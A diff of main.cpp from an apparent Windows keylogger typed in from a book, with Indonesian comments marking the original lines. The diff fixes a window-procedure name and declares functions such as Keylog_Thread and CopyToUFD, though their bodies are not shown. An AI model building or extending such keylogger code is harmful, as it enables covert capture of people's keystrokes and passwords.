@@ -1,6 +1,6 @@
 /* ---------------------------------------------
    nama file: main.cpp
-
+   halaman 37
    --------------------------------------------- */
 
 #include <windows.h>
@@ -10,14 +10,18 @@
 // ini aslinya gak ada
 #include <time.h>
 #include <stdlib.h>
-#include <stdio.h>
+//#include <stdio.h>
 
 #include "regaccess.h"
 
 using namespace std;
 
-LRESULT CALLBACK WindowsProcedure(HWND,UINT,WPARAM,LPARAM);
+// ini aslinya
+//LRESULT CALLBACK WindowsProcedure(HWND,UINT,WPARAM,LPARAM);
+LRESULT CALLBACK WindowProcedure(HWND,UINT,WPARAM,LPARAM);
+
 DWORD WINAPI Keylog_Thread(LPVOID Param);
+
 void InvokeLogFile(void);
 void CopyToUFD(void);
 char* DateTime_Now(void);
@@ -47,7 +51,10 @@ int WINAPI WinMain(HINSTANCE hThisInstance,
 
     wincl.hInstance = hThisInstance;
     wincl.lpszClassName = szClassName;
-    wincl.lpfnWndProc = WindowsProcedure;
+    // ini aslinya
+    //wincl.lpfnWndProc = WindowsProcedure;
+    wincl.lpfnWndProc = WindowProcedure;
+
     wincl.style = CS_DBLCLKS;
     wincl.cbSize = sizeof (WNDCLASSEX);
     wincl.hIcon = LoadIcon (NULL, IDI_APPLICATION);
